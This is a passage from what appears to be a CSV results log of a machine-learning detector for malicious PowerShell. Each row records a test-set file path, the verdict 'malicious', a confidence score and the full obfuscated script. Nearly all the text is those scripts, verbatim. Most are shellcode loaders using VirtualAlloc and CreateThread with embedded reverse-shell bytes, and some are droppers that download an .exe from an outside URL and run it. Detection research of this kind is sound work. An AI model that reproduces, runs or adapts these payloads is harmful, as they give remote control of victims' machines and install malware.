0x1000;','efini',',0x4e,0xee,0x29,0xbc,0x6f,0x3b,0xfd,0xec,0xdf,0x94,0xbe,0x5c,0xa0,0x','0x83,0xed,0xfc,0x31,0x45,0x13,0x03,0x44,0x1b,0x3c,0x1','0x44,0x1a,0xbb,0x34,0x93,0x5d,0x96,0x81,0x0b,0xa0,0x19,0xf2,0x02,0x67,0x4d,0xa2,0x3c','x7b,0xb8,0xe7,0x85','44,0x57,0xb6,0x2f,0xba,0x47,0xb9,0xe5,0xd3,0x60,0x05,0x06,0xdc,0x70,0','1,0xaa,0xc','31,0xe5,0x9f,0xa6,0xcd,0xf4,0x49,0xf7,0x2e,0x5a,0xb4,0x37,0xdd,0',',0xe3,0x52,0x72,0x77,0xb4,0xca,0x7','a,0x1c,0x87,0x16,0x8e,0x32,0xc1,0x81,0x26,0xaa,0x48,0x59,0xd','c5,0xb8,0x01,0x08','rc -Name 9mcWin329mc -namespace Win32Functi','x11,0x3a,0xdb,0x18,0xc6,0xed,0xb3,0xa6,','a,0','xcd,0x6d,0xaa,0x89,0xb5,0xd5,0x12,0','a,0x08,0xf4,0x2b,0xe4,0x4d','x5d,0x16,0x66,0xe5,0xa1,0xf6,0x66,0xf5,0xf7,0x9c,0x66,0x9d,0xaf',',0xd0,0xf5,0xcc,0x99,0xf4,0x08','7,0x',',0x30,0xca,0x11,0x32,0xea,'))  -Creplace'jAG',[char]39 -Creplace'idr',[char]36  -rEPLACE'9mc',[char]34) |. ( $vERbOSepReFERenCe.toStRIng()[1,3]+'X'-jOIn'')",malicious,TP
2026-07-13 16:37:47,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1154.ps1,custom-ps-ml,UNKNOWN,6de77f81-1fde-4da0-811a-309cb43cf9cb,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2731,1688.3," (((\""{37}{38}{39}{16}{21}{17}{36}{27}{33}{32}{34}{1}{13}{8}{3}{0}{44}{25}{15}{7}{12}{30}{22}{43}{26}{18}{45}{11}{9}{29}{41}{10}{2}{40}{42}{6}{24}{14}{5}{35}{28}{20}{4}{31}{19}{23}\"" -f 'xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,','x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0x','0x10,0x',',0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0','eThrea',' = zqiz.Length};zqix=zqiw::VirtualAlloc(0,0','2,0xd9,0xc8,0','9,0x44,0x24,0x24,0x5b,0','xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c','c0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0','36,0x6a,0x40,0x68,0x00,','0xd5,0x97,0x6a,0x05,0x68,0xd9,0xd9,0x0c,0x84,0x68,0x02,0x00,0x1e,0x61,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0x','x5b,0x61,0x59,0x5a,0x51,','c0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0','0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;zqig = 0x1000;if (zqiz.Length -gt 0x1000){zqig','58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x8','ress, uint dwSize, uint flAllocationType, ui','ionFlags, IntPtr lpThread','0x50,0x40,0x50,0x68,0xea,0x0f,0xdf','x,0,0,','oInt32()+zqii), zqiz[zqii], 1)};zqiw::Creat','nt flProtect);[DllImport(90Skernel32.dll90S)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreat','0,0x68,0x77,0x73,0x32,0x','0);for (;;){Start-sleep 60};','x5f,0xff,','e4,0x','0x50,0x50,0x50,0x50,0x40,','Import(90Smsvcrt.dll90S)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);1',',zqig,0x40);for (zqii=0;zqii -le (zqiz.Length-1);zqii++) {zqiw::memset([IntPtr](zqix.T','x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff','0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x0','d(0,0,zqi',';zqiw = Add-Type -memberDefinition zqic -Name 90SWin3290S -namespace Win','oj','32Functions -passthru;[Byte[]];[Byte[]]zqiz = 0xfc,0xe8,0','x1000','Id);[Dll','zqic',' = 1oj[DllImport(90Skernel32.dll90S)]public static extern IntPtr VirtualAlloc(I','ntPtr lpAdd','00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a',',0xd5,0x8b,0x',',0x00,0x56,0x53,0x57,0x68,0x0','5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,','0x75,0x',',0xe0,0xff,'))-CRePlAcE'zqi',[char]36  -CRePlAcE ([char]49+[char]111+[char]106),[char]39  -rEplACE([char]57+[char]48+[char]83),[char]34)|. ( $ShElLID[1]+$ShelliD[13]+'x')",malicious,TP
2026-07-13 16:38:01,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1173.ps1,custom-ps-ml,UNKNOWN,6ed12934-c129-48c8-b133-a29d25e8717d,DESKTOP-BAC9DBQ,malicious,0.9391,RandomForest,561,1715.71," &amp; ( $ShelLiD[1]+$SheLLid[13]+'X') ( (((\""{14}{4}{6}{20}{17}{18}{0}{1}{10}{19}{21}{5}{7}{9}{13}{25}{12}{23}{24}{22}{15}{26}{11}{27}{3}{2}{28}{29}{8}{16}\""-f'lient)','.Downlo',' (Zs','rt-Process','ject Sy','(XmRhttp://nikil','s','.','e','tk/k1/i','ad','sd);','R,Zsdz','k_001.','(New-Ob','_001.exe','xeZsd)','et.','WebC','F','tem.N','ile','v:TEMPEhqik','c','Aen','exeXm','Z','Sta','dzcAenv:TEMPEhqik_00','1.')) -ReplAce  ([chAr]90+[chAr]115+[chAr]100),[chAr]34 -ReplAce([chAr]88+[chAr]109+[chAr]82),[chAr]39 -ReplAce  'zcA',[chAr]36 -CRepLacE 'Ehq',[chAr]92))",malicious,TP
2026-07-13 16:38:15,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1178.ps1,custom-ps-ml,UNKNOWN,8c3a53bf-59a5-4e94-8c57-098e87385fd8,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2937,1542.09," (((\""{49}{6}{45}{21}{1}{36}{52}{32}{8}{34}{12}{33}{22}{28}{3}{56}{47}{39}{17}{69}{25}{50}{11}{4}{41}{40}{35}{10}{38}{55}{60}{16}{64}{63}{18}{67}{24}{26}{2}{46}{0}{15}{66}{42}{54}{37}{7}{48}{53}{31}{51}{59}{30}{57}{20}{68}{44}{13}{19}{29}{65}{23}{14}{9}{61}{43}{27}{5}{62}{58}\"" -f 'b,0x61,0x59',' flAllocationType, uint flProtect);[DllImport(iDhkernel32.dlliDh)]p','0x8b,0x0','tern IntPtr memset(IntPtr dest, uint ','0xff,0x31,0x','si], 1)};PI','lpAddress, uint d','50,0x68,0xea,0x','t dw','=PIsw::VirtualAll',',0x52,0x','x31,',', IntPtr lpStartAddres','36,0x','xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;PIsg = 0x1000;if (PIsz.Length -gt 0x1000){PIsg = PIsz.Length};PIs8v2Q',',0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0','01,0xd0,0x8b,0x40,0x78,0x85,0','0x','31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x7','6a,0x40,0x68,0x00,0x10,0x00','d5,0x6a,0x00,0x6a',' uint','r, uint dwCreationFlags, In','0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0',',0x58,0x1c,',',0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,','0x01,0xd3,','2Q.ToInt32()+PIsi), PIsz[PI','tPtr lpThreadId);[DllImport(iDhmsvcrt.dlliDh)]public static ex',',0x00,0x56,0x6a,0x00,0x68,0x58,0xa4','x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0','e6,0x6a,0x10,0x5','hread(IntPtr lpThreadAttributes, uin','s, IntPtr lpParamete','StackSize','0xcf,0x0d,0x01,0xc7,0xe2,0xf0','ublic static extern IntPtr Creat','x50,0x40,0x','57,0x8b,0x52,0','u;[Byte[]];[Byte[]]PIsz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,','ac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,','c0,0x','5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x','r (PIsi=0;PIsi -le (PIsz.Length-1);PIsi++) {PIsw::memset([IntPtr](PIs8v','0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x','wSize,','4,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5','e -memberDefinition PIseVT -Name iDhWin32iDh -namespace Win32Functions -passthr','0f,0xdf','PIseVT = UK0[DllImport(iDhkernel32.dlliDh)]public static extern IntPtr VirtualAlloc(IntPtr ','0x28,0x0f,0xb7,0x4a,0x26,0','6,','eT',',0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x05,0x80,0x68,0x02,0x00,0x01,0xbb,0x89,0x','01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0','x10,0x8b,0x42,0x3c','src, uint count);UK0;PIsw = Add-Typ','c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0x',',0,0,0);for (;;){Start-sleep 60};','0',',0x','oc(0,0x1000,PIsg,0x40);fo','sw::CreateThread(0,0,PIs8v2Q','9,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x','xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x4',',','x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x','5,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b',',0x04,0x56,','89,0xe5,0x31,0xd2,0x64,0x8b')) -CRepLAcE 'PIs',[cHAr]36 -CRepLAcE 'iDh',[cHAr]34-CRepLAcE ([cHAr]85+[cHAr]75+[cHAr]48),[cHAr]39)|&amp; ( $Env:ComSPec[4,15,25]-JOin'')",malicious,TP
2026-07-13 16:38:28,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1180.ps1,custom-ps-ml,UNKNOWN,0d6285f0-bcb8-46fb-b429-4eb20925d77e,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2839,1836.49," ((\""{26}{46}{2}{18}{40}{42}{17}{43}{37}{0}{38}{8}{36}{45}{25}{19}{12}{1}{24}{3}{29}{32}{9}{20}{5}{11}{13}{34}{22}{10}{31}{21}{44}{33}{27}{30}{6}{4}{7}{14}{35}{16}{28}{15}{23}{39}{41}\""-f'in32','xe3,0x3c,0x49,0x8b,0x3','e, uint ','1,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0x','000){tkmsize = tkmsc.Len',',0x5d,0x68,0x33,0x32,0x00,0x00,0x6',',0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;tkmsize = 0x1000;if (tkmsc.Length -gt 0x1','gth};tkmx=tkmw::VirtualAlloc(0,0x1000,tkmsize,0x40);for (tkmi=0','0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0','89,0x44,0x24,0',',0x10,0x56,0x57,0x68,0x99,','8,0x77,0x73,0x32,0x5f,0x54,0x6','xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0','8,0x4c,0x7',';tkmi -le (tkmsc.Length-1);tkmi++) {tk',', tkmsc[tkmi], 1)};tkmw::CreateThread(0,0,tkmx','oInt32()+','SMkernel32.dllXSM)]public s','flAllocationType, ','20,0','x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86','8,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68','0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0xc4,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a',',0,','4,0x8b,0x0',',0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x','tkmc = PpB[DllImport(XSMkernel32.dllXSM)]publ',',0x58,0xa4,0x53,0xe5,0xff,0x','tkmi)','e2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b','d5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3','0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x6',',0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x',',0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68','7,0x26,0x07,0xff,','mw::memset([IntPtr](tkmx.T','x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x','.dllXSM)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);PpB;tkmw = Add-Type -memberDefinition tkmc -Name XSMWin32XSM -namespace W','Functions -passthru;[Byte[]];[Byte[]]tkmsc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,','0,0);for (;;){Start-sleep 6','uint flProtec','0};','t);[DllImport(X','tatic extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(XSMmsvcrt',',0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a','31,0xff,0x31','ic static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSiz')).rePlaCe(([ChAR]116+[ChAR]107+[ChAR]109),[StrING][ChAR]36).rePlaCe(([ChAR]88+[ChAR]83+[ChAR]77),[StrING][ChAR]34).rePlaCe(([ChAR]80+[ChAR]112+[ChAR]66),[StrING][ChAR]39) |.( $pshomE[4]+$PsHoMe[30]+'x')",malicious,TP
2026-07-13 16:38:42,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1181.ps1,custom-ps-ml,UNKNOWN,eaea95fb-9e12-4bf7-b1bb-411bc10d24a1,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2892,1600.99,"(((\""{0}{27}{50}{14}{6}{18}{24}{22}{28}{5}{20}{26}{41}{52}{38}{10}{37}{56}{54}{4}{49}{30}{57}{63}{67}{42}{8}{3}{17}{12}{47}{23}{16}{60}{31}{62}{9}{58}{1}{44}{7}{34}{40}{53}{51}{64}{43}{48}{45}{35}{2}{66}{39}{15}{21}{46}{61}{68}{59}{19}{13}{65}{25}{32}{33}{11}{29}{36}{55}\"" -f 'jMcc = eX1[DllImport(DwEkerne','x','0xd5,0x','x75,0xf4,0x03,0x7d,0xf8,0x','xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0',', uint d','DllImport(DwEkernel32.dll','77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0','31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0','x68,0x33,0x32,0x00','0x52,0x30,','+) {jMcw::memset([IntPtr](jMcx',',0x8b,0x58,0x24,0x01,0xd3,0x6','1000){jMcg = jMcz.Length};jMc','llocationType, uint flProtect);[',',0x53,0','58,0x1c,0x01,0xd3,','3b,0x7d,0x24,0x75,0xe2,0x58','DwE)]public static extern IntPtr CreateThread(IntPt','f,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;jMcg = 0x1000;if (jMcz.Length -gt 0x','wCreationFlags, IntPtr lpThreadId);[DllImport(DwEmsvcrt.dllDwE)]public static extern IntPtr memset(IntPtr dest, uint src, uint cou','xe5,0','r lpStartAddress, IntPtr ','b,0x','r lpThreadAttributes, uint dwStackSize, IntPt',':VirtualAlloc(0,0x1000','nt);eX1;jMcw = Add-Type -memberDefinition jMcc -Name DwEWin32DwE -namespace Win32Funct','l32.dllDwE)]public static extern IntPtr VirtualAlloc','lpParameter','.ToInt32()+jMci), jMcz',',0','4,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51',',jMcg,0x40);for (jMci=0;jMci -','le (jMcz.Length-1);jMci+','xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50','0xc8,0x5f,0xff,','[jMci], 1)};jMcw::CreateThread(0,0,jMcx','0','e[]]jMcz = 0xfc,0xe8,0x86,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,',',0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4',',0x68,0x29,0x80,0x6b','ions -','0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x','x69,0x9c,0xb6,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0','00,0x68,0x','0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,','xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x','6,0x8b,0x0c,0x4b,0x8','xa5,0x74,0x61,0xff,','xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52','(IntPtr lpAddress, uint dwSize, uint flA','0x68,0x69,','passthru;[Byte[]];[Byt',',0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,',',0x52,0x14,0x8b,0x72,0x28,0x0f,0',',0,0,0);for (;;){Start-sleep 60};','x8b,0x52,0x0c,0x8b','x10,0x8b,0x42,0',',0',',0xf','0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x2','57,0x68',',0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x89,0x5d,0','x3c,0x8b,0x4c,0x10,0x78,0x','0','x=jMcw:','8b,0x36','e3,0x4a,0x01,0xd1,0x51,0x8b,0x59,',',0x02,0xd9,0xc8,0x5f'))-RePlace  'jMc',[CHAr]36 -RePlace'eX1',[CHAr]39-CREplACe 'DwE',[CHAr]34) |&amp; ( ([sTrIng]$VerBoSepReFEreNce)[1,3]+'x'-JOIN'')",malicious,TP
2026-07-13 16:38:55,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1183.ps1,custom-ps-ml,UNKNOWN,96db98df-df43-4ade-9e07-a9081e8ae4e0,DESKTOP-BAC9DBQ,malicious,0.9998,RandomForest,487,1946.24," ((\""{13}{15}{19}{35}{11}{10}{0}{16}{6}{24}{27}{23}{1}{31}{26}{18}{4}{32}{3}{14}{30}{22}{2}{20}{34}{36}{9}{5}{25}{7}{21}{29}{33}{8}{17}{12}{28}\"" -f'.Net','nloadFil','gg','worldn','tt','.e','We','mN','ss mNb','eble','m','yste','leeble.exem','(N','i','ew-Objec','.','f','h','t ','a.exe','b);Start-','.com/ni','ow','bClie','xe','(mNb','nt).D','Nb','Pr','t','e','p://','oce','m','S','Nb,mNbfle')).replAcE(([ChAR]109+[ChAR]78+[ChAR]98),[STrINg][ChAR]39) |&amp;( $sHeLlID[1]+$sheLliD[13]+'X')",malicious,TP
2026-07-13 16:39:08,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1196.ps1,custom-ps-ml,UNKNOWN,2578bede-def3-41ca-b0d0-abdc0db95cc7,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2860,1481.57,"((\""{15}{1}{14}{16}{23}{30}{44}{24}{43}{33}{34}{21}{41}{42}{0}{8}{7}{35}{10}{45}{40}{17}{31}{4}{3}{32}{19}{5}{39}{46}{9}{26}{11}{27}{22}{25}{18}{20}{13}{36}{12}{2}{28}{6}{29}{37}{38}\"" -f'Name QIGWin32QIG -namespace Win32Functions -passthru;  [Byte[]];  [Byte[]]tnVsc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7','rt(QIGkernel32.dllQIG)]publi','0,tnVsize,0x40);  for (tnV',',0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf','x31',',0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8','memset([Int','x3c,0x61,0x7c,0',',0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0','80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x','0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc','68,0x02,0x00,0x20,0x05,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0',' };  tnVx=tnVw::VirtualAlloc(0,0x100','0xd5,0x01,0xc3,0x29,','c static extern IntPtr Vir','tnVc = g8G  [DllImpo','tualAlloc(IntPtr lpAddress, uint dwSize, uin','0xe3,0x3c,0','x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0','xf8,0x3b,0x7d,0x24,0x75,0xe2','xff,','reationFlags, IntPtr lpThreadId);[DllImport(QIGmsvcrt.dllQIG)]p',',0x36,0x6a,0','t flAl','c extern IntPtr CreateThread(IntPtr lpThreadAttribut','x40,0x68,0x00,0x10,0x00,0x00,0','50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x4a,0xc1,0xce,0xcf,0x','x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b','i=0;tnVi -le (tnVsc.Length-1);tnVi++) {  tnVw::','Ptr](tnVx','locationType, uint flProtect);  [DllImport(QIGkern','x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0','4,0x03,0x7d,0',' uint dwStackSize, IntPtr lpStartAddress, IntPtr l','pParameter, uint dwC','x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,','0xc6,0x85,0xf6,0x75,0xec,0xc3;  tnVsize = 0x1000;  if (tnVsc.Length -gt 0x1000){  tnVsize = tnVsc.Length ','.ToInt32()+tnVi), tnVsc[tnVi], 1)  };  tnVw::CreateThread(0',',0,tnVx,0,0,0);  for (;;){  Start-sleep 60  };','b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x6','3,','ublic static extern IntPtr memset(IntPtr dest, uint src, uint count);  g8G;  tnVw = Add-Typ','e -memberDefinition tnVc -','es,','el32.dllQIG)]public stati','0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd','1,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x')).replacE(([cHar]103+[cHar]56+[cHar]71),[strinG][cHar]39).replacE(([cHar]81+[cHar]73+[cHar]71),[strinG][cHar]34).replacE(([cHar]116+[cHar]110+[cHar]86),[strinG][cHar]36)|inVOke-eXpRessIon",malicious,TP
2026-07-13 16:39:21,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1203.ps1,custom-ps-ml,UNKNOWN,9265f0ed-8c85-45c5-9053-8dfb3c8e0806,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,2762,1804.01,"(((\""{41}{24}{7}{40}{20}{30}{10}{21}{17}{23}{12}{28}{25}{22}{31}{45}{26}{44}{11}{29}{5}{18}{13}{43}{38}{15}{9}{27}{4}{6}{3}{33}{8}{19}{46}{14}{39}{16}{37}{42}{0}{1}{35}{2}{32}{34}{36}\"" -f',0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,','0','68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;wTIg = 0x1000;if (wTIz.Length -gt 0x1000){wTIg = wTIz.Length};wTIx=wTIw::VirtualAlloc(0,0x1000,wTIg,0x40);fo','0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4','0,0x','0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0','00,0x68,0x77,0x73,0x32,0x5f,','alAlloc(IntPtr lpAddr','00,0xff,0xd5,0x50,0x5',',0','ationFlags, IntPtr lpThreadId);[DllImport(Ienmsvcrt.dllIen)]public static ex','8b,0x34','me IenWin32','4,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01','32,0xd5,0x8','58,0x5f,0x5a,0x8b,0x12,0xeb,0x86','6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,','rc, uint count);8mZ;w','xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x2','0,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0','eThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddr','tern IntPtr memset(IntPtr dest, uint s','xd2,0x64,0x8b,0','TIw = Add-Type -memberDefinition wTIc -Na','rt(Ienkernel32.dllIen)]public static extern IntPtr Virtu',',0','0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18','x5d,0x68,0x33,0x32,0x0','Ien -namespace Win32Functions -passthru;[Byte[]];[Byte[]]wTIz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31',',0x8b,','ess, IntPtr lpParameter, uint dwCre','x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,','r (wTIi=0;wTIi -le (wTIz.Length-1);wTIi++) 